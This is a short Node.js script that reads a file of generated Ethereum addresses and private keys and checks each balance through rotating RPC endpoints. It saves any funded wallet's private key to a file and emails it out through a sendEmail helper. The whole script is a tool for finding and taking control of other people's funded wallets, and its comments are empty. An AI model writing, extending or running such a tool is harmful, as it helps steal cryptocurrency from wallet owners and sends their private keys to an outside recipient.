const fs = require('fs');
const sendEmail = require('./email'); // 
const { getBalance, rpcUrls } = require('./rpc.js'); // 

const addresses = fs
    .readFileSync('Generated wallet and key.txt', 'utf8')
    .split('\n')
    .map((val) => {
        return val.split(',');
    });

(async () => {
    let count = 0; // 
    let rpcIndex = 0; // 
    for (const [index, [address, privateKey]] of addresses.entries()) {
        if (index % 5 === 0 && index !== 0) {
            rpcIndex = (rpcIndex + 1) % rpcUrls.length; // 
        }
        try {
            const balance = await getBalance(address); // 
            if (balance > 0) {
                fs.appendFileSync('Wallet with balance.txt', `${address},${privateKey}\n`);
                // 
                sendEmail(address, balance, privateKey);
            }
            count++; // 
            console.log(`Generated Wallet ${count}/${addresses.length}: Address ${address} ${balance} ETH   RPC:${rpcIndex + 1}`);
        } catch (error) {
            console.error(`Error querying balance for address ${address} using RPC ${rpcIndex + 1}:`, error);
        }
    }
})();
